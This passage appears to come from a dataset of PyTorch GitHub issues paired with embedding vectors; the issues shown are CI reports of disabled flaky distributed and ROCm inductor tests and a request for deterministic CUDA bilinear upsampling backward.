  1.82391733e-01  1.61067083e-01 -3.58759105e-01 -1.66182667e-01
 -3.82685512e-01 -3.87612253e-01  5.35441756e-01  2.28898406e-01
 -1.24121137e-01 -5.08476123e-02 -2.17429996e-01  2.16334686e-01
  6.86932728e-03  1.05532229e-01  1.08990483e-01  8.35902393e-02
 -6.45420849e-02  1.50942236e-01  2.79390037e-01  1.29238442e-01
 -4.88645732e-01 -1.21211782e-01  7.11990893e-01  2.20911384e-01
  1.68311268e-01 -3.48215073e-01 -3.05202007e-01 -3.33383262e-01
 -2.07676608e-02  5.74321710e-02  1.20258845e-01 -3.66837950e-03
  3.01579744e-01  8.77395421e-02 -1.30699813e-01 -8.52648821e-03
 -1.12594619e-01  1.29631281e-01  2.76042670e-01 -2.53311634e-01
  6.22484721e-02 -4.78340805e-01  1.82885379e-01 -1.56436220e-01
  1.02068625e-01  2.77496189e-01  2.12825805e-01  2.46627152e-01
  1.50280789e-01  1.39807686e-02 -1.29696112e-02 -1.15701623e-01
  7.61204883e-02  2.54714668e-01 -1.42772481e-01 -2.52703100e-01
  3.27274382e-01  1.81293234e-01  3.00100297e-02  1.00499123e-01
 -2.01999858e-01  2.80536450e-02  1.92288794e-02  2.32404709e-01
 -2.36739546e-01 -3.88670415e-01 -2.42671043e-01  9.48422253e-02
 -1.38180047e-01  2.08268762e-01  1.48555875e-01  3.47051844e-02
  3.96897644e-01 -1.09214649e-01  3.34367231e-02 -3.57353985e-01
 -3.68589684e-02 -3.29866074e-03  3.70949924e-01  2.46113371e-02
 -1.22722454e-01  4.87655774e-02  2.87139863e-02 -1.04919903e-01
  2.53824472e-01 -5.31148016e-02 -2.15760916e-01  7.62500390e-02
  4.20648158e-01 -1.02325559e-01 -1.96384341e-01  2.91508853e-01
 -1.52403265e-01 -2.13873349e-02  5.47422051e-01 -1.90296873e-01
  2.16161609e-01 -8.98746550e-02  4.16948088e-02 -1.95824772e-01
  1.33555159e-01  2.39597961e-01  3.35785421e-03  7.73972124e-02
 -2.37400696e-01 -9.82622206e-02  1.40183747e-01  6.83424950e-01
 -1.09063834e-01 -1.24010429e-01  2.05599368e-01 -6.35626018e-02
  4.35230136e-01 -1.21597983e-01 -1.68760896e-01  1.73441917e-01
 -2.41994962e-01 -4.94169354e-01  2.01187823e-02  4.56584096e-02
 -3.11380643e-02 -1.57908067e-01  1.96356758e-01  2.29952723e-01
 -1.23238266e-01 -3.84689838e-01 -3.92627232e-02 -9.89124328e-02
 -1.86162591e-01  1.00906342e-01  3.55701298e-02 -3.48886140e-02
  4.44754720e-01 -2.13762268e-01 -3.64488900e-01  2.52637774e-01
 -2.26434860e-02 -7.11045563e-02  3.47538173e-01 -6.37150258e-02
 -3.54154892e-02  4.54484880e-01 -3.21011171e-02  1.38470680e-01
  5.25292516e-01  2.08220363e-01 -2.93412507e-01 -3.13093841e-01
  4.03560847e-02  3.64973307e-01 -2.05942988e-01  1.68091565e-01
  2.15888351e-01  3.22541371e-02 -4.04591739e-01  1.31958008e-01
 -4.01903540e-01 -2.87719369e-02  5.15855551e-02  2.82857716e-02
  4.90666255e-02 -2.48995423e-02 -1.28510773e-01 -3.17494750e-01
  1.31127581e-01 -2.80753255e-01 -7.41528943e-02  8.56809765e-02
 -5.78004718e-02  2.78447848e-02  4.44265939e-02  9.64017510e-02
 -1.62208319e-01  2.77526766e-01 -1.49208039e-01 -1.20625444e-01
  3.33775222e-01  2.22208560e-01 -4.05487716e-01 -1.09163776e-01
  1.32405937e-01  4.52568531e-02  1.24602541e-01 -2.38507062e-01
  6.71316236e-02 -2.06498012e-01 -1.16636619e-01  1.63622484e-01
 -1.92820936e-01 -5.57364412e-02  7.45607838e-02 -2.63332665e-01
 -2.84726709e-01 -6.58230036e-02 -3.53732752e-03 -2.47209802e-01
  3.13643605e-01  1.70007395e-03 -2.49299914e-01 -3.15044105e-01
 -8.49125534e-02 -3.06181878e-01 -4.21668813e-02  3.33260447e-02
  1.74452126e-01 -1.23343959e-01  9.71537270e-03  2.02328384e-01
 -9.45968479e-02 -2.42295474e-01 -3.65329593e-01 -1.19178742e-01
 -1.31639287e-01 -5.15587032e-02 -2.70704627e-02 -1.34861860e-02
 -5.11140823e-01  9.22501087e-02  3.65927257e-02 -1.65690780e-01
  1.65709749e-01 -1.54507875e-01  2.40601540e-01 -1.68521926e-02
 -1.03398591e-01 -2.84198165e-01 -2.10764542e-01  3.23649734e-01
 -6.00596845e-01 -2.89834291e-01 -7.69325122e-02 -4.79320996e-02
  1.29879832e-01 -5.85254878e-02  4.79904935e-02  1.29623394e-02
 -1.85500085e-01  8.30826983e-02 -7.91802406e-02 -3.92430902e-01
  3.50727260e-01 -4.71343398e-02  3.11530363e-02  4.54095900e-01
  8.02589059e-02 -2.66307175e-01  6.76203370e-02 -1.90149397e-01
  3.35273370e-02  3.10163468e-01  4.27624807e-02  4.20554459e-01
  1.65349513e-01  2.66359031e-01  4.49270941e-04  1.83352590e-01
  6.62066340e-02  6.99453652e-02  2.74381042e-01 -5.27062714e-01
  4.02755201e-01  8.22336227e-03  2.05080941e-01 -1.77905023e-01
  2.88683295e-01  4.30369377e-02 -2.03714008e-03  5.08777127e-02
  2.01754365e-03  2.18616337e-01 -2.01271683e-01  2.22157121e-01
 -5.99595532e-02 -1.34440035e-01 -1.02685302e-01 -2.98540175e-01
 -1.63826913e-01 -9.10336524e-02 -1.28324494e-01  1.65191472e-01
  3.77285004e-01 -5.21397069e-02 -2.89144516e-01  1.29324362e-01
  3.95499803e-02 -4.30402577e-01  1.24619462e-01 -1.02894992e-01
 -2.01044917e-01  2.41608784e-01  6.77739978e-02 -1.48029730e-01
  4.06693280e-01  1.13772407e-01  2.65846491e-01  1.52244106e-01
  2.69292086e-01 -2.59134859e-01  2.62637317e-01  9.20785666e-02
 -2.33849794e-01  3.80606979e-01  1.26002535e-01 -2.89934203e-02
 -3.42317939e-01  9.09920856e-02  6.28339127e-03  1.42790020e-01
 -6.05329163e-02 -3.10788453e-01 -5.43535352e-01  4.30506542e-02
  9.89543200e-02 -3.00432801e-01 -2.93385059e-01 -1.22272015e-01
  5.55511490e-02 -1.81564167e-01  1.16948977e-01 -2.29856335e-02
 -5.08492231e-01 -1.93213951e-02 -1.39548331e-01  3.46704982e-02
 -1.02933586e-01  5.60789108e-01  2.77551234e-01 -2.21633673e-01
  1.31300151e-01 -1.39181510e-01  4.04156446e-02 -4.32348922e-02
 -6.84423745e-02  1.09009191e-01  1.90604985e-01  3.00758243e-01
  1.24131709e-01 -2.44172774e-02  7.10016042e-02 -5.08257188e-02
 -3.17356735e-01 -1.41562164e-01  4.49779108e-02  4.95454669e-01
  1.14233091e-01  2.24500373e-01  3.05500716e-01  3.58161569e-01
 -3.16418350e-01 -4.18724835e-01 -4.27850485e-01 -3.40853333e-01
 -7.32555538e-02 -1.37881562e-03 -1.16808809e-01  2.08515435e-01
  2.15125829e-01 -8.80355760e-02 -4.63067919e-01 -6.55222088e-02
 -1.54819280e-01  2.22894222e-01  4.27906036e-01 -4.34370935e-02
  4.45780873e-01 -2.94585109e-01 -3.50951031e-02  1.92608953e-01
  4.53602195e-01  2.77284347e-02  8.17038938e-02  2.68408477e-01]"
DISABLED test_fsdp_tp_integration_tensor_parallel_size_2_cpu_offload_CPUOffload(offload_params=False) (__main__.TestTPFSDPIntegration) oncall: distributed skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2Ffsdp%2Ftest_fsdp_tp_integration.py%3A%3ATestTPFSDPIntegration%3A%3Atest_fsdp_tp_integration_tensor_parallel_size_2_cpu_offload_CPUOffload(offload_params%3DFalse))).

The bisection shows #111160 to be the culprit, but @fduwjj hasn't been able to reproduce it locally. 

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @wanchaol ",False,"[-2.79810250e-01 -3.00110281e-01 -3.31377745e-01  1.06283247e-01
 -8.09842274e-02 -3.12724948e-01 -4.00199145e-02  2.43935704e-01
 -6.55165911e-01 -2.44315952e-01  4.51321572e-01  5.16219549e-02
  1.09959982e-01 -7.80849978e-02 -4.37011242e-01 -2.00463459e-04
  1.14831872e-01 -2.82140464e-01  2.72214293e-01 -2.96773538e-02
 -2.24890992e-01 -1.95887126e-02 -1.60651058e-01  3.20798755e-01
  1.57508969e-01  9.37932283e-02 -2.18728576e-02 -1.13874804e-02
 -1.63297236e-01 -7.36127272e-02  4.29534793e-01  1.50638178e-01
 -3.65953088e-01 -1.75233677e-01  4.07765806e-01  7.70407468e-02
  8.51220936e-02 -2.55487084e-01 -8.46302360e-02 -2.67062992e-01
  1.22234179e-02 -3.87432165e-02 -7.85862356e-02  1.83489621e-02
  1.73568614e-02 -1.73362464e-01 -7.92065337e-02  2.87155181e-01
 -1.16238140e-01 -3.71049434e-01  2.92890340e-01 -1.31009147e-04
 -1.58756599e-03 -3.46298575e-01 -5.45921363e-03 -4.67446089e-01
  1.61779314e-01  1.86051711e-01 -3.41291204e-02  3.45135063e-01
  1.53205127e-01 -4.58953977e-02  3.74392539e-01 -6.97264820e-03
 -9.74843279e-03  1.11285076e-01  2.30774194e-01 -2.63117224e-01
  4.43598986e-01  1.72233973e-02 -5.10986298e-02  1.46927834e-01
 -4.96094584e-01  5.33760153e-02  2.35423580e-01  2.59078354e-01
 -2.39649653e-01 -4.64824289e-02  1.05478279e-02 -1.32009253e-01
 -1.69193715e-01 -5.08959182e-02  2.84348577e-02 -1.41616195e-01
  7.17224181e-03 -6.66092113e-02  9.71030891e-02 -7.68314153e-02
  1.26868501e-01 -1.23806953e-01  2.06512198e-01  1.63470268e-01
 -3.55488777e-01  2.91603850e-04 -1.90128684e-02 -2.71139622e-01
  9.42993164e-02 -2.70236373e-01 -3.75909507e-02  5.51037267e-02
  1.57186344e-01 -2.44855255e-01 -1.69851795e-01  1.26983672e-01
 -1.67855382e-01 -7.81313106e-02  2.04931110e-01  5.60738556e-02
 -1.66927967e-02 -1.19447887e-01  8.80741924e-02  2.02918760e-02
  3.06777000e-01  6.93591535e-02  9.58636925e-02  6.05288222e-02
 -7.31676891e-02 -2.11936384e-02  1.64322034e-01  6.54781684e-02
 -4.07041728e-01 -1.32260114e-01  2.23220319e-01 -1.01849521e-02
  3.91396165e-01 -2.70128518e-01 -5.42285070e-02  1.56006217e-01
 -1.77854896e-02 -3.08990359e-01  1.13923788e-01 -2.73951329e-02
  4.78781983e-02 -1.96172163e-01  1.98843688e-01  8.08197856e-02
 -2.29706123e-01 -1.99155658e-01 -5.31369001e-02 -4.16197293e-02
  3.92753258e-02  1.53374821e-01  8.29398930e-02 -3.35247904e-01
  2.25485444e-01  1.84123874e-01 -1.97913527e-01  3.48630577e-01
  2.94851735e-02  1.90352947e-01  2.41899103e-01 -1.61868017e-02
  1.61328346e-01  1.82201147e-01 -4.14634645e-02  1.35663345e-01
  5.05254626e-01 -5.03052995e-02 -1.99016668e-02 -3.09750378e-01
 -1.67280614e-01  3.34380329e-01 -3.14414769e-01 -4.74989042e-02
  2.72616982e-01 -1.78521015e-02 -2.82991171e-01  5.15730754e-02
 -1.50619984e-01  3.63400400e-01 -6.32622391e-02 -1.40905946e-01
 -1.29403174e-01  2.28814051e-01  2.04615742e-01 -8.39585215e-02
  2.33173385e-01 -5.04726231e-01 -2.85998195e-01  5.91404065e-02
  3.86435926e-01 -1.28029972e-01  3.08295965e-01  1.77003935e-01
  1.32855803e-01  2.64148951e-01  2.72359908e-01  1.96186602e-01
 -1.80184364e-01 -1.57253310e-01 -7.94453979e-01 -9.98771489e-02
  2.92596389e-02 -5.57419583e-02 -1.34764224e-01 -3.86722833e-01
  1.45874470e-01  8.77975971e-02  1.48662299e-01  1.65778831e-01
  8.13636705e-02 -2.08169267e-01  1.64416909e-01  3.79908569e-02
 -1.98688492e-01 -1.78014226e-02 -2.95994103e-01 -2.29047880e-01
  2.73811966e-01 -2.67479531e-02 -3.48117471e-01 -2.56877661e-01
 -2.65257597e-01 -2.23171949e-01 -3.09278518e-01 -2.97706798e-02
 -2.62755118e-02 -1.31222039e-01 -5.54074645e-02  3.45434129e-01
  2.33652145e-01 -1.79131463e-01 -1.81293562e-01 -2.05301553e-01
 -3.74097019e-01 -2.03535214e-01 -5.00970632e-02  1.91587955e-01
 -9.81425792e-02  1.69765159e-01  2.91449577e-03 -1.67858213e-01
  6.93312734e-02  3.55080068e-02  1.71410501e-01 -1.01487428e-01
 -1.06993988e-01 -3.51366460e-01 -3.56932282e-01  2.51944959e-01
 -3.53892058e-01 -2.87584722e-01 -1.29408371e-02  2.80358065e-02
  1.93365872e-01  3.42935383e-01  6.51914254e-02  1.29697606e-01
  6.94494024e-02  2.74746239e-01 -3.32412601e-01 -1.40055150e-01
  1.52270734e-01 -1.70537114e-01  2.78654754e-01  1.56145722e-01
 -3.82928923e-03 -4.77467775e-02  2.03352034e-01 -9.32486728e-02
 -5.46242371e-02  4.28537488e-01 -9.73182917e-03  6.76928997e-01
  2.10304722e-01  2.12253883e-01 -2.49647632e-01  1.86104432e-01
 -9.46115404e-02  5.65471873e-02 -2.16396246e-02 -4.32716370e-01
  1.49426281e-01 -1.49471853e-02 -1.73301905e-01 -1.17675856e-01
  4.94738281e-01  1.88605800e-01  1.30545884e-01  1.16911314e-01
  2.79812217e-01  3.67495179e-01  7.36940950e-02 -6.97780922e-02
  1.05554871e-01 -3.62245411e-01 -4.26288359e-02 -7.67073259e-02
 -2.04321012e-01 -2.46459454e-01 -7.94987660e-03  2.28256360e-02
  3.27370524e-01 -8.64896644e-03 -2.12205246e-01  1.00957692e-01
  2.35400885e-01 -8.39255750e-02  2.41765440e-01 -1.41881138e-01
 -1.73589468e-01  1.01804011e-01  1.22935466e-01  6.17062300e-02
 -1.37060717e-01 -1.73969537e-01  2.60710955e-01  2.50267554e-02
  5.13111115e-01 -2.22904250e-01  3.42132151e-01  1.28207698e-01
  2.31421255e-02  2.22429648e-01 -1.10648461e-01 -1.24084149e-02
 -2.88334906e-01  1.89392135e-01  1.95156157e-01  1.13647923e-01
  4.76755828e-01 -4.87900943e-01 -3.47550154e-01  2.74700314e-01
  7.81864002e-02 -3.41837257e-01 -2.95657754e-01 -2.03775521e-02
 -2.90595889e-02 -6.02039546e-02  6.05286323e-02 -2.34544612e-02
 -2.94477761e-01 -1.08121537e-01 -1.35768102e-02 -1.13492034e-01
 -1.00743271e-01  6.05885804e-01  1.43555135e-01 -1.21864036e-01
 -5.54688685e-02 -1.14542842e-02 -2.61577278e-01 -2.19585374e-01
  1.36179730e-01  1.17014557e-01  4.23368216e-01  1.18361592e-01
  9.16033536e-02 -1.10610276e-01 -1.14051938e-01 -2.58341700e-01
 -4.25165176e-01 -1.54900879e-01  1.37303397e-01  4.97235030e-01
  3.37930843e-02  2.02165782e-01  1.81329608e-01  4.05833662e-01
 -8.99637491e-02 -1.26039639e-01 -2.11065650e-01 -1.68873340e-01
  2.18125343e-01 -1.77387461e-01 -2.67047733e-01  2.59306461e-01
  3.69653970e-01  2.48469770e-01 -3.40342432e-01  4.13720071e-01
 -1.89197451e-01  2.32509717e-01  4.64450330e-01 -4.30943429e-01
 -1.61746174e-01 -3.50512266e-01 -1.44621015e-01  8.62075388e-02
  2.60014534e-01  9.04199332e-02  1.71812922e-01  1.35298952e-01]"
DISABLED test_fused_int_mm_mul_gating (__main__.TestPaternMatcher) module: rocm triaged module: flaky-tests skipped module: inductor,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_fused_int_mm_mul_gating) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17728965207).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_fused_int_mm_mul_gating`


Test file path: `inductor/test_pattern_matcher.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False,"[-0.22480986 -0.14279874 -0.2518372  -0.04633936 -0.17872618 -0.2428863
  0.31190956 -0.01045226 -0.26663926 -0.33440226  0.34877715 -0.25092217
  0.16618328  0.14570804 -0.34425467 -0.01394198 -0.49705884 -0.03497795
  0.22318129 -0.00319358 -0.12291194  0.01000353 -0.36854792  0.16478983
 -0.221648    0.18730141 -0.13050312 -0.13863388 -0.09704523  0.057045
  0.32131994  0.4194944  -0.27850258  0.05913223  0.39690378 -0.21931413
 -0.29847294 -0.07015989 -0.09502258 -0.28470033  0.3150639  -0.12265126
 -0.09714565 -0.06177457 -0.07333004  0.16102652 -0.04906929  0.16390267
 -0.3005065  -0.15483063  0.16963431 -0.06677011 -0.13885507 -0.40381852
  0.13004142 -0.12612595  0.14905965  0.11064185 -0.00346108  0.32675695
  0.05177133  0.2029391  -0.16529197  0.10725082 -0.07792293  0.3320028
  0.20456427 -0.07373962  0.21588612  0.07753883 -0.1210143  -0.06669535
 -0.28365472  0.09676739  0.17173296  0.29263836 -0.14411534 -0.02818794
  0.02966351 -0.08718814 -0.11690538  0.28875268  0.04017688 -0.33741534
  0.28054455 -0.14174137  0.08288857 -0.02192288 -0.05228376 -0.23963988
  0.37016186  0.23476793  0.01286291  0.21571879  0.14667721  0.1173468
 -0.0841953  -0.1914416  -0.22367719 -0.08632497 -0.20346344 -0.02612536
 -0.11549364  0.3061209  -0.5941467  -0.13576055  0.29441893  0.15567562
  0.11592934  0.13068177  0.02123912 -0.08870447  0.00247657  0.03880209
 -0.06487215  0.25659424 -0.03193549 -0.14116287  0.07059255  0.5005326
 -0.26085073 -0.36627007  0.10108349  0.08801969  0.1966929  -0.00968197
 -0.11771998  0.04609854  0.15029997  0.00493794  0.05948395  0.09835476
  0.00436269  0.18700372  0.01416716 -0.01698997 -0.15702817  0.0899663
  0.20353743  0.23711878 -0.31664515  0.17862839 -0.1860277   0.04426735
  0.3466657  -0.14294179 -0.3614571   0.02306294  0.05830494  0.22782917
  0.1376349  -0.04947578  0.05937219  0.62775546 -0.00193229 -0.17432126
  0.4030514   0.09528662 -0.07196715 -0.13272862 -0.15645587  0.43190044
  0.03434775  0.01304651  0.28798825 -0.06149351 -0.4451233   0.06144563
  0.01763392  0.12753963  0.32450497  0.06281736  0.20301704 -0.15430468
  0.13582407 -0.18866333  0.11755528 -0.03134663 -0.09347279  0.35103327
 -0.07437114  0.25340632  0.34318605 -0.07216558 -0.21614602  0.03165252
  0.03081214  0.04257528 -0.01524578  0.05936568 -0.38571107  0.01420471
 -0.0104755  -0.20366776 -0.2642247  -0.24559739  0.07989035 -0.27542663
 -0.0681281   0.01454138 -0.02609188  0.04792956  0.00105241 -0.37377363
  0.00758314  0.10184896  0.05061359 -0.25515693 -0.02053192  0.44427615
 -0.12958603 -0.42423585 -0.11030349 -0.2549333  -0.16931556  0.27465045
  0.02624769 -0.0954161   0.08985455  0.05237958  0.21508314 -0.18938634
  0.10948603 -0.20712754 -0.11775713 -0.12285523 -0.00488774  0.23857051
 -0.13053894 -0.08893707  0.16549008  0.04977468  0.11360306  0.0697474
  0.24152651 -0.16110116 -0.03386086 -0.28262818  0.25082564  0.04210652
 -0.36957604 -0.3849612   0.01252982 -0.03484654  0.29934287  0.2816382
  0.04322487 -0.3064616  -0.21331725  0.14442435 -0.2659176  -0.3091653
  0.2790579   0.44372958  0.11410929  0.4453625  -0.07170179 -0.17629026
  0.09205461 -0.3605352   0.28113735  0.55326533 -0.2753366   0.13552502
  0.13315691  0.170169   -0.33385724  0.1076678  -0.2222397   0.01850961
  0.0852825  -0.48564962  0.29812822  0.03782986  0.33939895 -0.17165351
  0.23135084 -0.32035494 -0.01330193  0.03092911  0.13822171  0.10393737
 -0.25331753  0.39860588  0.34358752 -0.09994137 -0.05050637 -0.4426871
 -0.07480616  0.05773655 -0.00209178  0.18041566  0.11710614 -0.00432673
 -0.2560307   0.06761891  0.09798285 -0.19820729  0.27571756 -0.23452148
 -0.444974    0.0213091   0.19300218 -0.22105087  0.08096616 -0.05495592
 -0.00596989  0.325908    0.16164504 -0.30117026  0.04364564  0.21793061
  0.15888794  0.27463526 -0.05285124  0.00382957 -0.11144409  0.44535768
  0.08754463  0.05254862  0.07589408  0.01511377 -0.3872937  -0.04354601
  0.0408782   0.14905578 -0.30246294 -0.1152429  -0.24824113 -0.04650405
  0.01740524 -0.20840426 -0.12339195  0.08262596  0.17949337 -0.26323807
  0.0042585   0.3580851   0.30142394 -0.3741455  -0.16786739  0.13594896
 -0.02159516 -0.09333194 -0.30209807 -0.0571366   0.2772407   0.33984724
 -0.14719942  0.29266435 -0.00757136  0.00701484 -0.11304709  0.01911346
 -0.25123236  0.26321298  0.08347931  0.10524812  0.06616138  0.23737587
 -0.1377033  -0.15015295 -0.34121013 -0.20142505  0.2161725  -0.14149602
  0.01039803 -0.22063023  0.12112001  0.2644095  -0.35498112  0.24770717
 -0.11167246 -0.12784065  0.21548666 -0.31085527  0.37592337 -0.11882094
  0.1656116   0.28987288 -0.1220604  -0.19447389  0.04654288  0.1351525 ]"
DISABLED test_fused_int_mm_mul (__main__.TestPaternMatcher) module: rocm triaged module: flaky-tests skipped module: inductor,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_fused_int_mm_mul) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17711524027).

Over the past 72 hours, it has flakily failed in 12 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_fused_int_mm_mul`


Test file path: `inductor/test_pattern_matcher.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False,"[-0.19107468 -0.09758563 -0.27204353 -0.05316393 -0.19489533 -0.23329872
  0.14656523 -0.04744361 -0.322067   -0.36511287  0.41308933 -0.30224374
  0.09694161  0.11442484 -0.25832266 -0.13686997 -0.4897333  -0.0501028
  0.17702234  0.12440131 -0.18029556 -0.00273616 -0.38184935  0.13467935
 -0.19897337  0.22364569 -0.14380604 -0.10870303 -0.0400683   0.03428465
  0.40730602  0.35863012 -0.12964335  0.11958792  0.45001453 -0.20278278
 -0.29106358 -0.12905969 -0.07458457 -0.32433498  0.26268125 -0.10433668
 -0.09646562 -0.0055957  -0.11189067  0.09134075 -0.04222003  0.18228212
 -0.19585578 -0.13372362  0.11670326 -0.04644109 -0.1258959  -0.39066088
  0.09574825 -0.11725111  0.14910491  0.1654926   0.01298967  0.31937826
  0.058992    0.18390304 -0.23724619  0.06397955  0.00824079  0.43439797
  0.19212586 -0.1399518   0.18393014 -0.02568981 -0.06450766 -0.00663081
 -0.32712308  0.0681802   0.1554875   0.26801744 -0.17433101  0.00966372
  0.00667305 -0.07742704 -0.20263699  0.25059736 -0.01416939 -0.2436828
  0.26676452 -0.14190024  0.00694282 -0.04761335 -0.11441097 -0.35214186
  0.29324377  0.19456145 -0.02592105  0.2834884   0.20269045  0.07132583
 -0.03945459 -0.04254677 -0.16494933 -0.03396907 -0.19659698 -0.11098079
 -0.17710407  0.2821536  -0.6317513  -0.08510956  0.253594    0.10051934
  0.11358011  0.08755375  0.02074112 -0.05390029 -0.03753062  0.02181638
 -0.01429287  0.25314397 -0.01494066 -0.15118116 -0.00692564  0.526124
 -0.25156602 -0.35368025  0.11651383  0.07308532  0.15390143 -0.1470938
 -0.14896753  0.0901335   0.04899359  0.01187105  0.11636475  0.06606605
  0.04647033  0.10477848  0.07193355 -0.00434431 -0.14820647 -0.00406059
  0.17874593  0.22851837 -0.3143978   0.15683207 -0.21995293 -0.03909802
  0.37479818 -0.03083601 -0.36033934  0.08526988  0.04935669  0.2748689
  0.1528076  -0.06104032  0.11574492  0.62280035  0.01277011 -0.10425255
  0.4459142   0.1614463  -0.08279112 -0.23178789 -0.17021033  0.46314088
  0.01698011  0.11494243  0.2148262  -0.02754768 -0.47550604  0.01217709
 -0.04971437  0.17312114  0.21526492  0.04757969  0.25858402 -0.20827894
  0.09821077 -0.20944674  0.13978341  0.00197117 -0.06218198  0.38416278
 -0.07467886  0.18164164  0.34161747 -0.11667068 -0.16302618  0.13143744
 -0.02628033  0.11105828  0.00542618  0.07985493 -0.43806583  0.12833129
 -0.1416392  -0.1390835  -0.3026146  -0.27199048  0.09012236 -0.17741492
 -0.02355638  0.06580228 -0.07456165  0.12515473 -0.03430266 -0.36645868
  0.01133473  0.06426421  0.07222135 -0.24791461 -0.05026864  0.4775791
 -0.17377098 -0.41811213 -0.1174861  -0.22216427 -0.13310395  0.2656837
  0.01021269 -0.13424897  0.01263645  0.03821219  0.20249994 -0.22429341
  0.15783459 -0.18519214 -0.07391531 -0.1785278  -0.09446067  0.17433071
 -0.10175553 -0.08408126  0.12363714  0.10454108  0.06168784  0.13670334
  0.33478844 -0.1661952  -0.02049209 -0.29664934  0.19184056  0.06396171
 -0.30095914 -0.42548293  0.01502292  0.07022184  0.27373943  0.29615995
  0.04565473 -0.31696692 -0.2553631   0.12581807 -0.3231557  -0.37484527
  0.33019307  0.42392552  0.07769758  0.36636198  0.0113614  -0.047931
  0.09344441 -0.30032626  0.21399824  0.55643606 -0.19936371  0.0966979
  0.12390222  0.1820947  -0.3568641   0.14118564 -0.269364    0.06704092
  0.2016022  -0.48121578  0.28838813 -0.04568222  0.33194464 -0.08885908
  0.26589182 -0.3192406  -0.04530001  0.09287906  0.01056867  0.1085791
 -0.25489473  0.4316901   0.36019325 -0.13103554 -0.03797769 -0.3391198
 -0.12845738  0.02947864 -0.05780656  0.14878446  0.07518065 -0.02196414
 -0.2818914   0.08125371  0.09042164 -0.10385328  0.20636536 -0.15698224
 -0.45335215  0.04664174  0.15394756 -0.19153473  0.0237956  -0.09231268
 -0.01859047  0.28875238  0.18921362 -0.3223955   0.10456023  0.20049879
  0.07166136  0.35825783 -0.02232456  0.04664265 -0.04158668  0.4592248
  0.05295072  0.06068853  0.10565075  0.06993838 -0.4311996  -0.08909715
 -0.01153838  0.14521146 -0.3646434  -0.18105991 -0.24920656  0.05289393
 -0.01056746 -0.20805788 -0.08678429  0.06888652  0.07919641 -0.2416297
 -0.03487867  0.32685786  0.35438067 -0.36321443 -0.10925116  0.12708876
 -0.03766302 -0.11501034 -0.29102278 -0.04113275  0.25458395  0.2671852
 -0.12369902  0.35301065  0.10356627  0.01222093 -0.19983843 -0.00735165
 -0.14527845  0.25933337  0.14760458  0.09592077  0.08207241  0.25505918
 -0.04877825 -0.08300098 -0.3802262  -0.23176853  0.28258985 -0.11314948
 -0.00172065 -0.16984993  0.13170968  0.23392637 -0.4226515   0.2362063
 -0.14841725 -0.14865571  0.2707618  -0.23368016  0.36466843 -0.13510355
  0.16979316  0.2879824   0.06726398 -0.19477549  0.08594409  0.12402528]"
Feature Request: Add Deterministic Support for  `upsample_bilinear2d_backward_out_cuda` feature module: nn triaged module: determinism,"### ðŸš€ The feature, motivation and pitch

Please add the deterministic support for this operation in pytorch: `upsample_bilinear2d_backward_out_cuda`.  
Below is the error message I am getting when I use `torch.use_deterministic_algorithms(True)` in my code. 
``` 
RuntimeError: upsample_bilinear2d_backward_out_cuda does not have a deterministic implementation, but you set 
'torch.use_deterministic_algorithms(True)'. You can turn off determinism just for this operation, or you can use the 
'warn_only=True' option, if that's acceptable for your application. You can also file an issue at 
https://github.com/pytorch/pytorch/issues to help us prioritize adding deterministic support for this operation. 
```


### Alternatives

_No response_

### Additional context

_No response_

cc @albanD @mruberry @jbschlosser @walterddr @mikaylagawarecki @kurtamohler",False,"[-2.61335671e-01  1.52077824e-01 -3.13392937e-01 -1.01582378e-01
  2.87328064e-01  1.21770333e-03 -5.34613431e-03  5.21280169e-02
 -5.95829904e-01  4.37744260e-02 -6.12238422e-03 -2.46253610e-01
  1.02632359e-01  5.22895046e-02  1.00344874e-01  1.18463174e-01
  2.56549194e-02  1.07154131e-01 -4.15921770e-02 -1.40855044e-01
  2.15464145e-01 -7.07046241e-02 -1.71440378e-01  4.76544276e-02
 -2.87069269e-02  5.17433062e-02 -2.17367023e-01 -1.77470237e-01
  2.41893739e-01  2.02775095e-03 -3.23410854e-02  7.83436745e-02
  6.81537669e-03  5.43205328e-02  5.83684854e-02  5.41567057e-03
 -2.65254766e-01 -8.49077851e-02 -1.41797617e-01  7.81306103e-02
  6.51765019e-02 -1.63034480e-02 -1.42067194e-01 -2.85747170e-01
 -2.10618809e-01 -8.24172199e-02 -1.79066405e-01  4.34571207e-01
 -3.26099873e-01 -1.57174587e-01  2.05623090e-01  2.60336816e-01
 -3.65982540e-02 -2.80065954e-01 -6.27151579e-02 -5.90953380e-02
 -2.46242687e-01  1.35096133e-01 -4.52416018e-02 -1.72959149e-01
  4.33340728e-01  3.10452525e-02 -1.54683828e-01 -6.36107996e-02
 -1.60910517e-01  2.51493394e-01 -1.35818690e-01  3.51676464e-01
  5.47072649e-01  8.14991370e-02  4.31355983e-02 -3.43920197e-03
 -2.43786603e-01 -1.08069167e-01  1.66127786e-01  1.75769441e-04
 -2.46973470e-01  1.26089483e-01 -2.75007367e-01 -2.21784383e-01
